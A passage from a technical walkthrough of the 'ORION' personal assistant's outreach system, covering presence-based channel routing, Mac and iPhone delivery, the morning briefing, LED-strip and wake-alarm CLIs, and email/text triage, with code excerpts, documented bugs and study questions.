| `--silent` | no | off | Turns `mac-voice` into `mac-bubble`. Does nothing for phone or already-silent channels. |
| `--channel auto\|phone\|mac` | value | `auto` | `phone` forces the phone (`reason: "asked for the phone"`, ignores quiet hours). `mac` runs `chooseChannel` with `idleSeconds: 0, locked: false` so Nick counts as at the Mac (headphones/out/quiet still matter). Any other value is treated like `auto`. |
| `--loud` | no | off | Say it at full volume (100, unmuted), restored after 180 s. Ignored if headphones are in. Used by the morning briefing. |
| `--listen` | no | off | After speaking, the app listens a few seconds for an answer (`AppState.listenAfterReach`). |
| `--dry-run` | no | off | Compute and print the decision; skips the eval refusal; writes nothing; no `open`. |
| `--json` | no | off | Print the ledger entry as JSON (for `--dry-run` and for a real send). |

- **Contracts**
  - **Ledger row** (`outreach.jsonl`): `{id:"reach-<ms>-<6hex>", at:<ISO>, text, kind, why, channel:"phone"|"mac-bubble"|"mac-voice"|"hold", reason, urgent, headphones, loud, listen}`. A fallback to phone appends a *second* row with the same `id`.
  - **Outbox row** (`outreach-outbox.jsonl`): `{id, text, kind, push}`. Drained by the Link app (4.4).
  - **Exit codes**: 0 for sent, for `NOT SENT`, for eval refusal, for dry run; 2 for usage errors. There is no non-zero code for "the phone is unreachable".
  - **Stdout lines**: `Sent — his phone (notification + chat) (<reason>).`, `... the Mac, silent bubble ...`, `... the Mac, aloud ...`, `... held until morning ...`; `NOT SENT: <reason>.`; `Not sent: reaching Nick — ORION is in an evaluation run, so nothing goes out to anyone.`
  - **Env**: `ORION_CONTROLLED_DIR` (state dir), `ORION_EVAL_MARKER` (via `eval-mode.mjs`).
- **Calls out to**: `scripts/lib/reach/presence.mjs` (-> `facts.mjs` shell commands, `orion-now`, calendar bridge), `/usr/bin/open -g orion://reach?id=...`. No network. No model.
- **History**
  - `a139f4b` 2026-10-07 "ORION messages Nick first — presence-aware outreach, watches, triage (WIP)" (creation of `orion-reach`, `route.mjs`, `presence.mjs`, `facts.mjs`, `orion-presence`, `triage.mjs`, `orion-watches`).
  - `dce48ae` 2026-10-08 "morning briefing when Nick is actually up" (added `--loud`, `--listen`, kind `morning`).
  - Eval-mode guard came with `c2eda84` 2026-09-30 (`lib/eval-mode.mjs`), after the umbrella incident (4.10).
- **Gotchas & lessons**
  - **Rate limiting is per ledger, not per caller.** The fallback second row (same id) counts again toward the 6-per-hour cap, and `hold` rows count toward dedupe but not toward the cap (`route.mjs:35-36`).
  - **A phone message is only "sent" into a file.** `orion-reach` has no knowledge of whether the Link app is running or CloudKit works; it prints `Sent` once the outbox line is appended. If the Link app is down the line waits in the outbox.
  - **`--urgent` is not "send now no matter what".** It only changes the quiet-hours branch.
  - The comment in `AppDelegate.outreach` (line 207) that `orion-reach` "opens the URL before it appends the line" is stale; the script appends first. The app still retries 10 x 0.2 s, which is harmless.
  - `entry.channel` can differ from the first ledger row; readers (the app) take the newest row with that id.
- **Walk it yourself**
  - `sed -n 28,73p scripts/orion-reach`.
  - `node scripts/orion-reach "test" --dry-run --json` is safe (prints the decision; no send, no write). The brief says never to send; a dry run does not send. **Do not run it without `--dry-run`.**
  - `tail -5 ~/.openclaw/orion-controlled/outreach.jsonl` to see real ledger rows (contains message text; read only).
  - Read `tests/reach-route.test.mjs` for the channel truth table.
- **Questions to ask your tutor**
  1. Draw the decision tree for `chooseChannel` and mark which branch each of `--channel mac`, `--silent`, `--urgent` changes.
  2. Why does `orion-reach` append to the ledger before `open`, and what race did that fix?
  3. What would the phone see for a `mac-voice` message? For a `phone` message? (Hint: outbox `push`.)
  4. Why is `--loud` ignored when headphones are in?
  5. What happens at 01:00 (75 min past a 23:45 bedtime) if Nick is typing at the Mac and `orion-proactive` produces `bed-late`? Trace it, and say why it would not be held even if quiet hours worked.

---

### 4.3 Presence and routing: `facts.mjs`, `presence.mjs`, `route.mjs`, `orion-presence`

- **What it is** — Four small pieces that answer "where is Nick and how should ORION reach him right now?". `facts.mjs` reads the Mac. `presence.mjs` adds calendar context and the quiet-hours flag. `route.mjs` is the pure decision function plus the anti-nag rules. `orion-presence` is a read-only CLI that prints the result.
- **Where**
  - `scripts/lib/reach/facts.mjs:1-35` (parsers 5-23, `sh` 25, `gather` 27-35).
  - `scripts/lib/reach/presence.mjs:10-25`.
  - `scripts/lib/reach/route.mjs:6` (`IDLE_AWAY_SECONDS`), 14-22 (`chooseChannel`), 25-30 (`speakingVolume`), 33-38 (`allowed`).
  - `scripts/orion-presence:12-16`.
- **How it works**
  1. **Facts** (`gather()`), each with a 4 s timeout, any failure yields `""`:

| Fact | Command | Parser | Meaning |
|---|---|---|---|
| `idleSeconds` | `/usr/sbin/ioreg -c IOHIDSystem -d 4` | `parseIdleSeconds` finds `"HIDIdleTime" = N` and divides by 1e9 | seconds since last keyboard/mouse input; `null` if unparsed |
| `locked` | `/usr/sbin/ioreg -n Root -d1` | `parseLocked` tests `"CGSSessionScreenIsLocked"=Yes` | screen locked |
| `pluggedIn` | `/usr/bin/pmset -g batt` | `parsePluggedIn` tests `'AC Power'` | on AC; used by watches to decide whether the local model may run |
| `headphones` | `/usr/sbin/system_profiler SPAudioDataType -json` | `parseHeadphones`: default output device is Bluetooth/AirPlay transport, or its name matches `headphone|airpods|buds|beats` | headphones/speakers-in-ear |
| `volume`, `muted` | `/usr/bin/osascript -e "get volume settings"` | `parseVolume`; default `{volume: 50, muted: false}` | current output volume |

  2. **Presence** (`presence.mjs:10-25`). Starts from `gather()`. Computes `minute`, then (try/catch) `liveDay(localDate(now))`: a *fixed* block covering this minute makes `out = true`, `where = "at <title without the ' — ...' suffix>"`; otherwise a commute wall (`commuteWalls(blocks, loadConfig())`) covering this minute makes `out = true`, `where = travel.title`. Default `out = false`, `where = "home"`. Then it runs `orion-now --json` (8 s timeout) and sets `quiet = sleep.state === "night"`. Returns `{...facts, out, where, quiet, ...chooseChannel(all)}` so the object includes `channel` and `reason`.
  3. **Channel** (`route.mjs:14-22`):
```js
// scripts/lib/reach/route.mjs:14-21
export function chooseChannel(facts, { urgent = false } = {}) {
  if (!facts || typeof facts !== "object") throw new TypeError("facts required");
  const away = facts.locked || facts.displayAsleep || !(Number(facts.idleSeconds) < IDLE_AWAY_SECONDS);
  if (facts.quiet && !urgent) return { channel: "hold", reason: "quiet hours — it waits until morning" };
  if (away) return { channel: "phone", reason: facts.locked ? "the Mac is locked" : `no activity on the Mac for ${Math.round((facts.idleSeconds ?? 0) / 60)} min` };
  if (facts.headphones) return { channel: "mac-voice", reason: "he's at the Mac with headphones in" };
  if (facts.out) return { channel: "mac-bubble", reason: "he's at the Mac but out (class or a plan) — no sound" };
  return { channel: "mac-voice", reason: "he's at the Mac at home" };
}
```
  Order matters: **quiet -> away -> headphones -> out -> home**. `IDLE_AWAY_SECONDS = 5 * 60` (line 6). Truth table:

| quiet | urgent | away (locked / idle >= 300 s) | headphones | out | result |
|---|---|---|---|---|---|
| yes | no | any | any | any | `hold` |
| yes or no | yes (or quiet no) | yes | any | any | `phone` |
| - | - | no | yes | any | `mac-voice` |
| - | - | no | no | yes | `mac-bubble` |
| - | - | no | no | no | `mac-voice` |

  4. **Anti-nag** (`allowed`, 33-38): returns `{ok:false, reason:"already told him that recently"}` if any ledger row has the same normalised text (`lowercase`, non-word runs to one space, trimmed) within `windowMs = 2 h` (hold rows count here); or `{ok:false, reason:"already reached him 6 times this hour"}` if 6 or more non-`hold` rows are under an hour old.
  5. **Volume** (`speakingVolume`, 25-30): target 35 with headphones, 45 without; muted or current < 20 -> target; current > 70 -> 55; else unchanged. The Swift `ReachVolume.target` (`native/Orion/Sources/Orion/ReachVolume.swift:7-12`) duplicates this; the code comment on the Swift side points back to `route.mjs`. Nothing in the JS ever applies the volume; `speakingVolume` is exercised by tests and mirrored in Swift (`AppState.deliverReach` -> `ReachVolume.prepare`).
- **`orion-presence` CLI** (`scripts/orion-presence:12-16`). Read-only. `orion-presence` prints a line like `<channel>: <reason>. Idle <n>s, <where>, plugged in|on battery[, headphones].` `orion-presence --json` prints the whole presence object (channel, reason, idleSeconds, locked, pluggedIn, headphones, volume, muted, out, where, quiet). No other flags; unknown flags are ignored.
- **Contracts**
  - `facts` object: `{idleSeconds:number|null, locked:bool, pluggedIn:bool, headphones:bool, volume:0-100, muted:bool}`; `presence()` adds `{out, where, quiet, channel, reason}`.
  - `chooseChannel(facts, {urgent})` returns `{channel: "phone"|"mac-bubble"|"mac-voice"|"hold", reason}`. Pure; throws `TypeError` if `facts` is not an object.
- **Calls out to**: `ioreg`, `pmset`, `system_profiler`, `osascript` (all local, no permissions beyond Bluetooth/audio read), `orion-now --json`, `lib/life/live-day.mjs` (calendar through the Mac bridge), `lib/life/commute.mjs`, `lib/life/config.mjs`.
- **History**: all created in `a139f4b` 2026-10-07. `orion-presence` unchanged since.
- **Gotchas & lessons**
  - **`quiet` is always false, so `hold` is never chosen.** `presence.mjs:22` tests `sleep.state === "night"`, but `orion-now` never returns `"night"`. `scripts/lib/life/sleep-state.mjs:6-19` returns `day`, `unknown`, `awake_late`, `probably_asleep` or `winding_down`; `scripts/orion-now:39` additionally rewrites `unknown` to `awake_late`. Result: the header promise "his planned night -> held until morning" (`orion-reach:14`) is not implemented. The ledger agrees: 37 rows, 17 `mac-voice`, 17 `phone`, 3 `mac-bubble`, 0 `hold` (read 2026-10-14). Also, nothing would release held messages if it worked: there is no code that replays `hold` rows (the outbox is skipped for `hold`, `orion-reach:68`).
  - **`displayAsleep` is read by `chooseChannel` but never set** by `gather()` (grep finds it only in `route.mjs`). Display-asleep detection is therefore not implemented; only lock and idle time count as "away".
  - **A failed idle read counts as "at the Mac".** `Number(null)` is 0, and `0 < 300` is true, so if `ioreg` fails and `idleSeconds` is `null`, `away` is false. Likewise `bed-late`'s `Number(ctx.idleSeconds) < 300` passes on `null`.
  - "Out" is derived from the *plan*, not from actual location: a fixed calendar block or a commute window. If Nick skips class, ORION still thinks he is out (silent bubble).
  - Channel truth is "at the Mac" = the Mac saw input in the last 5 minutes. Sitting in front of a Mac and watching a video for 6 minutes = phone.
- **Walk it yourself**
  - `node scripts/orion-presence --json` (read-only; spawns ioreg etc.).
  - `sed -n 1,38p scripts/lib/reach/route.mjs` and `tests/reach-route.test.mjs`.
  - `sed -n 1,19p scripts/lib/life/sleep-state.mjs` and search the repo for `"night"` to confirm nothing returns it.
- **Questions to ask your tutor**
  1. Why is `chooseChannel` pure and `presence()` impure? What does that let the tests do?
  2. If `ioreg` were removed from the Mac, which channel would every message use and why?
  3. What are the three smallest changes that would make quiet hours real (detect the state, release the held messages, and surface a morning digest)?
  4. Why does headphones-in beat `out`?
  5. Why is the dedupe window 2 hours but the rate window 1 hour?

---

### 4.4 Delivery on the Mac and on the phone (Swift side)

This section is the receiving end of 4.2. It is condensed from the dossier `docs/learn/_fragments/raw/trace-proactive-nudge.md`, with line numbers re-checked against the code at HEAD `6c93032`.

- **What it is** — Three native programs consume `orion-reach`'s output. The ORION Mac app handles `orion://reach` and speaks/shows the message. The ORION Link app (`native/OrionLink`, the Mac-side CloudKit bridge) turns outbox lines into CloudKit records. The iPhone app (`native/OrionMobile`) subscribes to those records and shows a notification.
- **Where**
  - `native/Orion/Sources/Orion/AppDelegate.swift:172-177` (URL handler), `:185-188` (`orion://lights`), `:204-219` (`outreach(id:)`).
  - `native/Orion/Sources/Orion/AppState.swift:478-518` (`deliverReach`), `:741-760` (`announceReminder`).
  - `native/Orion/Sources/Orion/ReachVolume.swift:7-44`.
  - `native/OrionLink/App/LinkEngine.swift:74-90` (tick loop), `:140-180` (`deliverCheckins`), `:184-220` (`deliverOutreach`).
  - `native/OrionMobile/App/CloudLink.swift:88-106` (subscription), `native/OrionMobile/Sources/MobileCore/LinkSnapshot.swift:43` (record type name).
  - `native/Orion/Sources/Orion/LifeWatch.swift:1-56`; `DashboardView.swift:39,245-247`.
- **How it works**
  1. **The clock.** `DashboardView` owns `RefreshTicker(interval: 3)`; each tick calls `lifeWatch.tick()`. `LifeWatch` guards with `now >= next` and a `running` flag and sets `next = now + 5*60` (`LifeWatch.swift:18-22`). It spawns three processes sequentially off the main thread with the pinned Node binary (`~/.openclaw/tools/node-v24.15.0/bin/node`): `orion-watch tick --json`, `orion-watches tick`, `orion-proactive tick`. All stdout/stderr go to `/dev/null`; if Node or `orion-watch` is missing the tick returns silently (`:25-28`). The header (`:9-11`) explains why it lives in the app: "this app holds the Calendar permission the calendar bridge needs". The dashboard's ticker "lives as long as the app does", and a launchd agent `com.nickmadaio.orion.dashboard` (`/usr/bin/open -na Orion`, `RunAtLoad`) keeps the app running per the dossier. This is why the nudges do not depend on cron or on a login shell.
  2. **Mac handoff.** `AppDelegate.application(_:open:)` matches `orion://reach?id=...`, reads the ledger (`outreach(id:)`: scans `outreach.jsonl` newest first, retrying 10 times at 0.2 s), and calls `state.deliverReach(entry.text, aloud: channel == "mac-voice", headphones, loud, listen)`.
  3. **`deliverReach`** (`AppState.swift:493-518`): appends the line to the transcript; if the dashboard window is visible, the text also goes into its chat (`saveChat` + `chatMode = true`) instead of a pop-up, otherwise `reachMessage = text` and `onWantsSummon?()` bring up the hologram without taking focus. The bubble text clears after 120 s. If `aloud`: `loud` -> `ReachVolume.raiseToFull(restoreAfter: 180)` (100, unmuted, then back to the original level after 180 s; a second briefing before the restore keeps the *original* level), else `ReachVolume.prepare(headphones:)`; then `listenAfterReach = listen` and `speak(text, origin: .voice)`, which goes to the TTS daemon over `~/.openclaw/orion-tts.sock` (`com.nickmadaio.orion.tts`, per the dossier; `TTSClient.swift:160`).
  4. **Reminders.** The app's own reminder scheduler (`announceReminder`, `AppState.swift:741-760`) composes its text in Swift (`"Reminder — it's <time>, the time you asked me to remind you."` for generic labels, `"Reminder: <label>."` for alarms, `"<label> is up."` otherwise) and calls `orion-reach <line> --kind reminder --urgent --why "a reminder he asked for"` through the installed script. History: `announceReminder` itself dates from `3a87a71` 2026-08-04; routing it through `orion-reach` is recorded in `HANDOFF.md:66` ("reminders fire through orion-reach with their label"; I did not identify the exact commit). The trigger was Nick on 2026-10-07: "remind me at 6:55 for the drop" fired as a silent line in the window.
  5. **Phone handoff.** `LinkEngine` ticks every 4 s and calls `deliverOutreach()`; check-ins every 8th tick (~30 s). `deliverOutreach` reads `outreach-outbox.jsonl`, **truncates it**, and builds CloudKit records: a `LinkCommand` chat record (`device:"orion"`, `kind: chat`, `status: done`, `reply: text`, empty command text, so the phone shows a message from ORION with no words from Nick), and if `push == true` a `LinkAlert` (`kind:"orion"`, `level:1`, text capped at 240 chars, record name `reach-<id>`). On a CloudKit error it appends the old text back to the outbox and sets `problem`.
  6. **iPhone.** `CloudLink.swift:88-106` registers a `CKQuerySubscription` on `LinkAlert` creation (`subscriptionID "orion-link-alerts"`), with a visible alert whose body is the record's text field, so the notification text is the message itself.
- **Contracts**
  - `orion://reach?id=<id>` (consumer: Mac app). `orion://lights?do=...` (4.5). `orion://morning-screen[?close]` (4.5).
  - Files: `outreach.jsonl` (ledger; app reads), `outreach-outbox.jsonl` (Link app drains), `alerts-outbox.jsonl` (written by `orion-watch` and the plugin; also drained by the Link app, as `LinkAlert kind:"checkin"`).
  - CloudKit record types: `LinkCommand`, `LinkAlert` (schema in `native/OrionMobile/Sources/MobileCore/LinkSnapshot.swift`).
- **Calls out to**: the TTS daemon socket, AppleScript `set volume`, CloudKit.
- **History** (from the dossier plus `git log`): `a139f4b` 2026-10-07 (first outreach); `094ebe2` / `562c9f1` 2026-10-07 (`LifeWatch` runs `orion-proactive` and `orion-watches`); `dce48ae` 2026-10-08 (`ReachVolume.raiseToFull`, loud/listen); LinkEngine touched by `ae41446`, `ff0ec35`, `017d51c`, `51e0b56`, `b59bdca` (2026-09-30 to 10-08).
- **Gotchas & lessons**
  - **Read-then-truncate outboxes lose lines appended in between** (both `outreach-outbox.jsonl` and `alerts-outbox.jsonl`). Concurrency is low, but the race is real.
  - **Check-in alerts are not re-queued on a CloudKit failure**, unlike outreach (`LinkEngine.swift:216-219` restores only the outreach text). Check-in alerts that fail to save are lost.
  - If the ORION Mac app is not running, `orion-reach` falls back to the phone and says "the ORION app isn't running". The first (mac-*) ledger row remains, so the ledger can record a Mac attempt followed by a phone row.
  - The Link app and the Mac app are different programs. The nudge clock lives in the Mac app but phone delivery needs the Link app running too.
- **Walk it yourself**: open `LifeWatch.swift` and read the whole file (60 lines); then `AppDelegate.swift` line 172 and 204; then `LinkEngine.swift` line 184.
- **Questions to ask your tutor**: (1) Why does `LifeWatch` run installed copies instead of the repo copies, and what is the deploy implication? (2) What happens to a phone message if the Link app is closed for an hour? (3) Why does `deliverReach` put text in the dashboard chat rather than the hologram when the dashboard is open? (4) How would you make the outbox drain race-free?

---

### 4.5 The morning briefing: `lib/reach/morning.mjs`, `orion-morning`, `orion-lights`, `orion-wake`

- **What it is** — When ORION sees Nick is actually up, it turns on the LED strip, puts the day and weather on the Mac screen, and says a short briefing aloud at full volume, then listens for a reply. "Actually up" is a phone signal (unplugged, or a few minutes of phone use, or opening ORION on the phone) rather than an alarm time, because (Nick, quoted in `morning.mjs:1-5`) turning an alarm off is one tap. The words are a template: **no model composes the briefing**. `orion-wake` is the opposite direction: it asks the phone to set an alarm. `orion-lights` talks to the LED strip through the Mac app.
- **Where**
  - `scripts/lib/reach/morning.mjs:1-219`: constants 7-11, `shouldBrief` 24-37, `alarmClock` 45-50, `spokenClock` 53-58, `describeSky` 68-81, `weatherFacts` 90-114, `weatherLine` 117-131, `rainLabel` 134-139, `composeBriefing` 146-170, `weatherSymbol` 173-184, `buildView` 190-219.
  - `scripts/orion-morning:1-119` (command dispatch 40-63, signal path 65-88, `gather` 104-119, `showScreen` 95-102).
  - `scripts/orion-lights:1-57`, `scripts/orion-wake:1-34`; Swift: `native/Orion/Sources/Orion/StripLight.swift` and `MorningScreen.swift`.
- **How it works (the signal path)**
  1. The Link app runs `orion-morning signal <unplugged|used|up> --at <ISO>` whenever the phone reports a non-bed sleep-log event (`HANDOFF.md:55`).
  2. `orion-morning` refuses in an eval sandbox (`:54`); reads `planned` wake from `orion-now --json`; `alarmClock()` takes the earlier of the planner's alarm and a wake Nick asked for today in `wake-request.json` (fix for 2026-10-08: he moved the alarm to 7:15, the planner said 09:00, and his 7:15 unplug was judged too early).
  3. `shouldBrief()` (`morning.mjs:24-37`) says no if: unknown signal; no valid time; `briefedToday`; the signal is older than 20 min (`STALE_MS`); more than 2 min in the future; before 04:00 or at/after 13:00; or more than 45 min before the alarm. Every decision (yes or no) is appended to `morning.log`.
  4. If yes: `showScreen(view)` writes `morning-view.json` and opens `orion://morning-screen`; then `orion-lights on 100 warm` (25 s timeout) "the strip coming on is the cue that ORION is about to talk" (`:77`); then:
```js
// scripts/orion-morning:80-81
const sent = spawnSync(process.execPath, [join(here, "orion-reach"), text, "--kind", "morning", "--urgent", "--loud", "--listen",
  "--channel", "mac", "--why", `morning: ${gate.reason}`], { encoding: "utf8", timeout: 30000 });
```
     Success is recorded (once per day) only when the output starts with `Sent` (`:83`), so a `NOT SENT` does not burn the day's briefing (unlike `orion-proactive`, which has the opposite bug). State: `morning-sent.json`, 14 days kept.
  5. `composeBriefing()` builds the text from parts: greeting (`Morning, Nick.` before noon, else `Hey Nick, you're up.`), up to 4 fixed non-commute events (`Today you've got A at 9, B at 11:30 and 2 more.` or `Nothing on the calendar today.`), `Leave by <time>.`, `Due today: ...` (up to 3) or `Top of your list: ...` (2), the weather line, and the fixed closing question `Anything you want to change?`
  6. The weather line (`weatherLine`) reads like: `Partly cloudy, 10 degrees now. High of 15, low of 8. No rain today.` or `Rain likely from 2 to 5, 70% chance — take an umbrella.` A wet hour is `rainChance >= 40 || rainMm >= 0.2 || snowCm > 0`; "likely" is chance >= 70.
- **Flags of `orion-morning`**

| Command | Effect |
|---|---|
| `signal unplugged\|used\|up [--at ISO] [--dry-run]` | The full path above. `--at` is the time the phone saw the signal (default now). `--dry-run` appends nothing to `morning.log`, does nothing visible, and prints `DRY RUN — would say aloud (<reason>): <text>`. |
| `preview` | Print what he would hear now. Sends nothing. |
| `show` | Put the morning screen up on the Mac now (silent). |
| `status` | `Briefed at HH:MM (phone <signal>).` or `No morning briefing yet today.` |
| other | usage line, exit 2. |

- **`orion-lights`** (`scripts/orion-lights`). What it is: the CLI for Nick's Bluetooth LED strip (Lotus Lamp X family, advertises as ELK-BLEDOM/MELK; per the handoff "MELK-OA10"). It does no Bluetooth itself: it opens `orion://lights?do=...&brightness=...&color=...` with `/usr/bin/open -g`, then polls `~/.openclaw/orion-controlled/lights-status.json` (path under `ORION_CONTROLLED_DIR`) every 300 ms for up to 20 s for a newer mtime, prints the result and exits 0 (ok) or 1 (not ok or no answer). `StripLight.swift` (CoreBluetooth) does the real work and writes the status file.
  - Arguments (case-insensitive): verb `on | off | scan | brightness | color`; `on` accepts optional `0-100` (with optional `%`; > 100 -> exit 2), a colour name, or hex `RRGGBB` / `#RRGGBB`. Names: `warm ffa040, white ffffff, red ff0000, green 00ff00, blue 0000ff, purple 8000ff, orange ff6000, pink ff3080`. `brightness N` requires a number; `color X` requires a colour. `scan` lists strips the Mac can see (prints name, signal, id per device). Unknown words -> exit 2 with usage. If the app is not running: `The ORION app isn't running, so the lights can't be reached.` exit 1. No answer in 20 s: `No answer from the ORION app about the lights (it may be asking for Bluetooth permission on the Mac).` exit 1. Constraint: the strip accepts one connection, so Lotus Lamp X on the phone must be closed.
  - Model-facing: allowed through `exec` and documented in `plugin/orion-control/src/job-instructions.ts:7` and `plugin/workspace/AGENTS.md:254`; the claim checker treats `Lights not changed: ...` as a failure (`tests/v3-claims.test.mjs:19`) so ORION cannot say "lights are off" after a failed call.
  - History: `f1fe2b2` 2026-10-08 (creation, with `StripLight.swift`).
- **`orion-wake`** (`scripts/orion-wake`). What it is: sets tomorrow's wake-up alarm on Nick's iPhone. The alarm lives on the phone (AlarmKit); this script leaves a request where the phone link publishes it and the phone sets the real alarm. Reason (header, 2026-09-29): asked "wake me up at 7:30", ORION said "Done" and nothing happened.
  - `orion-wake` (no args): prints the pending request (`Wake-up set for Wed 07:30 (asked ...)`) or `No manual wake-up; the phone uses the automatic one (first class minus get-ready time).`
  - `orion-wake HH:MM` (regex `^([01]?\d|2[0-3]):([0-5]\d)$`): the next occurrence (today if still ahead, otherwise tomorrow); writes `wake-request.json` `{at: ISO, setAt: ISO}` under `~/.openclaw/orion-controlled/` (note: this one ignores `ORION_CONTROLLED_DIR`, `:12`). Then reads `~/Library/Application Support/ORION Link/status.json`: if `writtenAt` is within 120 s it prints `Sent to Nick's iPhone: alarm for <when>. The phone sets it the next time ORION refreshes there...`; otherwise `Saved an alarm for <when>, but the phone link on this Mac is not running, so the iPhone has not received it. Say so.` (an instruction to the model to be truthful).
  - `orion-wake clear`: deletes `wake-request.json`; the phone returns to the automatic alarm.
  - Bad format: `usage: orion-wake HH:MM | clear`, exit 2. Exit is 0 even when the phone link is not running (the message text carries the truth; `v3-claims` keys on the wording `Sent to Nick's iPhone`).
  - Consumers: `native/OrionLink/Sources/LinkCore/SnapshotReader.swift:179` publishes it as `wakeRequest`; `orion-morning` reads the same file (`alarmClock`). Model use: `plugin/workspace/AGENTS.md:56,172`. History: `a796471` 2026-09-30.
- **Contracts**: files `morning-sent.json`, `morning.log`, `morning-view.json`, `wake-request.json`, `lights-status.json`; URLs `orion://morning-screen`, `orion://lights`; weather from open-meteo (4.6, `weather.mjs`).
- **History**: `dce48ae` 2026-10-08 (briefing), `f1fe2b2` 2026-10-08 (lights), `27242e0` 2026-10-08 (morning screen), `2e27833` and `188afeb` 2026-10-08 (alarm-he-asked-for fix; clearer weather).
- **Gotchas & lessons**
  - The briefing goes through `--channel mac`, so if a fixed block is on at that minute `out` is true and the briefing becomes a **silent** bubble. **(inferred)** acceptable on class mornings only if he is not at home.
  - `orion-wake` exit 0 even when the phone has not received it; the model must read the stdout (see `plugin/orion-control` claim rules).
  - The 13:00 cutoff means a late riser gets no briefing at all.
- **Walk it yourself**: `node scripts/orion-morning preview` (read-only, makes the weather request to open-meteo), `node scripts/orion-morning status`, `sed -n 24,37p scripts/lib/reach/morning.mjs`, `node scripts/orion-wake` (read-only status form), `tests/reach-morning.test.mjs`.
- **Questions to ask your tutor**: (1) Why is "unplugged the phone" a better wake signal than "alarm dismissed"? (2) Why is the wake alarm taken as the *earlier* of planned and asked? (3) Why does `orion-morning` check the stdout prefix `Sent` while `orion-proactive` checks the exit code? (4) What guards stop the lights and a 100 % volume briefing from firing at 03:00?

---

### 4.6 Watches and triage: `lib/reach/triage.mjs`, `lib/reach/weather.mjs`, `orion-watches`, `lib/notify/triage.mjs`

- **What it is** — `orion-watches` is the third script the app runs every 5 minutes. It keeps small standing watches (weather conditions, incoming texts, important email) and tells Nick through `orion-reach` when one hits. `lib/reach/triage.mjs` holds the logic: who is important, which words are urgent, the local-model prompt, and the weather matcher. `lib/reach/weather.mjs` fetches the forecast. A *different* `lib/notify/triage.mjs` (a rules-only notification triage/digest) exists but is **not wired to anything** (see below).
- **Where**
  - `scripts/lib/reach/triage.mjs:5-72`: `importantPerson` 8-15, `URGENT` 17, `importancePrompt` 20-25, `parseVerdict` 27, `judge` 34-42, `weatherHit` 45-60, `parseWeatherWatch` 63-72.
  - `scripts/lib/reach/weather.mjs:10-20`.
  - `scripts/orion-watches:1-137` (commands 40-67, `tick` 69-116, `localModel` 121-129, `gmail` 131-136).
  - `scripts/lib/notify/triage.mjs:1-195`.
- **How it works**
  - **Weather** (`weather.mjs`): place from `location.json` `{ "place": "London" }` (default `London`); geocode through `https://geocoding-api.open-meteo.com/v1/search?count=1&name=<place>` then `https://api.open-meteo.com/v1/forecast?latitude=..&longitude=..&hourly=temperature_2m,precipitation_probability,precipitation,snowfall,weather_code,wind_speed_10m&forecast_days=2&timezone=auto`, 10 s timeout each. Returns `{hours: [{time, day: "today"|"tomorrow", tempC, rainChance, rainMm, snowCm, code, windKph}]}`, keeping tomorrow entirely and only the remaining hours of today. No API key.
  - **Weather watches** (`weatherHit`): rain = a chance >= 60 or >= 0.5 mm; snow = any snowfall; storm = code >= 95; wind = >= value (default 40 km/h); below/above = a temperature crossing. Output example: `Rain likely tomorrow from about 3 PM (70% chance).` `parseWeatherWatch("rain tomorrow")` -> `{kind:"weather", condition:"rain", day:"tomorrow"}`; unknown text throws `TypeError('say what to watch for: rain, snow, storm, wind, below N or above N (°C), and "tomorrow" if not today')`.
  - **`orion-watches tick`** (`:69-116`). Skips in an eval sandbox. `plugged = parsePluggedIn(pmset)`; `model = plugged ? localModel : null`.
    1. Weather: for watches not fired today and not checked in the last 55 min, fetch once, call `weatherHit`; a hit becomes a `warning` line with `why: "weather watch: <said>"` and the watch is marked `firedOn: today` (told once a day).
    2. Texts: only if `state.gate`. Reads `messages-recent.json` (exported by the app), takes up to 15 unseen messages, calls `judge`. Important ones become `Text from <sender>: “<first 160 chars>”` kind `update`. `seen.texts` keeps 500 ids.
    3. Mail: if `state.mail` (default on) and 9 min since the last check, runs `orion-gmail-search --json --max 10 "in:inbox newer_than:1d -category:promotions -category:social -category:forums"`. The first run only records what is already there. Each of up to 8 fresh threads goes through `judge` with context "Northeastern University London, classes and internships". A Gmail `invalid_grant`/oauth error sets `mailProblem: "Gmail needs signing in again"`.
    4. Each resulting line is sent with `spawnSync(node, [orion-reach, text, "--kind", kind, "--why", why])` (stdio inherited, 30 s timeout). State persisted to `watches.json` (mode 0600).
  - **The model, and its exact prompt** (`triage.mjs:20-25`), sent to local Ollama `qwen3.5:9b` at `http://127.0.0.1:11434/api/generate` with `{stream:false, think:false, keep_alive:"30m", options:{temperature:0, num_predict:3}}` (3 tokens, 20 s timeout), only when the Mac is plugged in:
```text
// scripts/lib/reach/triage.mjs:21-24 (template; ${...} filled per item)
You screen ${about.channel} for Nick, a university student (${about.context}). Decide if this one is worth interrupting him for RIGHT NOW: something from a person that needs him, a change to a class, deadline, interview, appointment or money, or anything time-sensitive. NOT worth it: newsletters, promotions, receipts, social media, automated notices, group chatter, small talk.
From: <from, 80 chars>
Subject: <subject, 120 chars>          (only when there is a subject)
Text: <text, 400 chars>
Answer with one word: important or skip.
```
    `parseVerdict` accepts a leading `important` or `skip`; anything else is `skip` ("the local model gave no clear answer"). Order inside `judge`: (1) sender matches one of Nick's `people` by name substring or last 10 digits of a number -> important "from <person>"; (2) `URGENT` regex (`urgent|emergency|asap|call me|right now|hospital|accident|are you ok|where are you|deadline (is )?(today|tonight|moved)|cancel(l)?ed|due (today|tonight|tomorrow)`) -> important "urgent words"; (3) no model (on battery) -> skip "on battery: only his people and urgent words get through"; (4) otherwise ask the model. Design rule from the header: the model only answers important-or-skip and "never Claude, never a guess" on battery. Usage is logged to `local-usage.jsonl` (`source: "watch triage"`, token counts).
- **Flags of `orion-watches`**

| Command | Effect |
|---|---|
| `add weather "<phrase>"` | Parse with `parseWeatherWatch`, add `{id:"w-<6hex>", kind, condition, value?, day, said, added}`. Only `weather` is supported. |
| `list` | One line per watch (`id  weather: <phrase> (told him <date>)`), then `Texts gate: ON/off · Important mail: on/off · Always gets through: ...`. |
| `remove <id>` | Remove a watch; exit 1 if unknown. |
| `people [add\|remove "<name or number>"]` | Show or edit the important-people list. |
| `gate on\|off` | Turn the text gate on or off. While on, ORION reads new texts and tells him only those that matter (his phone's Gated Focus silences the rest). |
| `mail on\|off` | Important-mail alerts (default on). |
| `tick [--dry-run]` | One watch cycle (what the app runs). `--dry-run` prints `DRY RUN would tell him: ...` and does not save state or call `orion-reach`. |

